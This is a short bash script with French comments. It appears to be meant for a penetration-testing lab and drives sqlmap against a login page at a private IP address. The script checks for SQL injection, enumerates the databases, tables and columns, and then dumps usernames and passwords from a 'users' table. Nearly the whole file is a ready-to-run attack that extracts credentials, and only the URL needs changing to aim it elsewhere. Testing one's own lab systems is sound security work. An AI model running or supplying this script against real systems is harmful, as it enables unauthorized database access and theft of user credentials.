#!/bin/bash

# Définition de la cible (modifie l'URL selon ton lab)
TARGET="http://192.168.203.10:80/login.php?id=1"

echo "[+] Début du scan SQL Injection sur $TARGET"
sleep 1

# Détection de la vulnérabilité SQLi
sqlmap -u "$TARGET" --batch --dbs > result_sqli.txt

# Vérifier si une vulnérabilité a été trouvée
if grep -q "available databases" result_sqli.txt; then
    echo "[!] Injection SQL détectée !"
    
    # Extraire les bases de données
    sqlmap -u "$TARGET" --batch --dbs --output=result_dbs.txt
    cat result_dbs.txt | grep -i "available databases"

    # Tester l'extraction des tables si la base de données 'mydb' existe
    sqlmap -u "$TARGET" -D mydb --tables --batch --output=result_tables.txt

    # Extraire les colonnes sensibles si la table 'users' est présente
    sqlmap -u "$TARGET" -D mydb -T users --columns --batch --output=result_columns.txt

    # Tenter d'extraire les identifiants si la colonne 'password' existe
    sqlmap -u "$TARGET" -D mydb -T users -C username,password --dump --batch --output=result_dump.txt
else
    echo "[+] Aucun vecteur SQLi détecté."
fi

echo "[+] Fin du test SQL Injection."
